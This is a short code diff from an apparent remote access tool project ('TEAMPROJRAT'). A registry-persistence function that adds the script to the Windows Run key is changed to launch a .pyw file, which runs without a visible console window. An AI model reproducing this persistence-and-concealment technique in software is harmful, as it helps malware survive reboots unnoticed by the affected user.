@@ -9,7 +9,7 @@ def AddToRegistry():
     pth = os.getenv("HOMEPATH")
 
     # name of the python file with extension 
-    s_name="C:" + pth + "\\Desktop\\TEAMPROJRAT-master\\UDP_Connection\\pos.py"
+    s_name="C:" + pth + "\\Desktop\\TEAMPROJRAT-master\\UDP_Connection\\pos.pyw"
 
     # key we want to change is HKEY_CURRENT_USER  
     # key value is Software\Microsoft\Windows\CurrentVersion\Run 
